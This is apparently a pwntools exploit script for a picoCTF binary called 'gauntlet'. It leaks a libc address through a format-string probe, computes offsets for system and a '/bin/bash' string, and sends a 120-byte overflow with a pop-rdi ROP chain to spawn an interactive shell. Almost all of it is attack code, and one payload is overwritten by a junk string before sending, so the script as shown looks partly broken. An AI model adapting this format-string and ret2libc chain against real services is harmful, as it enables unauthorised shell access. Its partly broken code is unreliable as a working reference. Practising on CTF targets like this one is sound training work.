from pwn import *

elf = ELF('./gauntlet')

local = True

if local:
    p = elf.process()
else:
    port = 57648
    host = "mercury.picoctf.net"
    p = remote(host, port)

gadget = 0x400793
ret = 0x40053e
p.sendline("%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p")
r = p.recvline()
print(r)
print("Address in LibC: " + str(r.split(",")[1]))

startOfLibC = int(r.split(",")[1],16)-4118736

system = startOfLibC + 324944
execv = startOfLibC + 937328
cat = startOfLibC + 77747
popRDI = startOfLibC + 137682
gets = startOfLibC + 524688
bin_bash = startOfLibC+1785370

print("System " + hex(system))
print("Execv " + hex(execv))
print("Cat " + hex(cat))
print("PopRDI "+ hex(popRDI))
print("Gets " + hex(gets))
print("bin_bash " + hex(bin_bash))

payload = "A"*120 + p64(gets)
payload2 = "A"*120 + p64(popRDI) + p64(bin_bash) + p64(system)
payload2 = "aksdjfkjsdhfkjsdhkfljbhagbriaubcjnvbuybieufbsajnvbilsauhhgfuiasbfsjdnkafbilawubliuauwbfiljbajdsbfjlawhnbfiuwa4ybfiawbfiabfhsdjbfsdafsdfkjbwkjafbiulasbdfklnsabluyfbearlwiufbjsdbvjhsddbfiyuywbefywbfjhsbdnmvjhxchvbieufhsifsadflsakfdo;sahf;oawnunnabeifbiu;dfbauifisuafhliashfliuashdfilashdfiuahsidf"
raw_input("Send?")

p.sendline(payload)
p.sendline(payload2)
p.interactive()